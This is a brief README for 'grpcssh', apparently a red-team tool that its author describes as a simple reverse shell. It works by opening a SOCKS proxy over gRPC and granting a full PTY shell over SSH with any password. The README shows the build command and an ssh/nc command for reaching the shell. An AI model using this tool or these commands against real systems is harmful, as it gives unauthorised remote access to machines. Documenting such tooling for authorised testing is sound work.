# `grpcssh` (now with proper concurrent socks)
```
better explained over at https://tishina.in/ops/grpcssh
an extension over grpc-ssh-socks. this can be considered a simple reverse shell. on connect,
a socks proxy is opened by the server. connecting over ssh to a hardcoded ip address with
an arbitrary password grants a full pty shell.

for the pty shell, full credit goes to https://gist.github.com/jpillora/
here it is, kind of working:
```
![image](https://github.com/zimnyaa/grpcssh/assets/502153/b3e4fce7-8ba4-46ce-9cff-d62fa4f7290f)

```
~/grpcssh$ make 
to build this even more abominable thing. 
~/grpcssh$ ssh -o ProxyCommand="nc -x localhost:1080 %h %p" -o "UserKnownHostsFile=/dev/null" root@1.1.1.1
to get a shell.
```
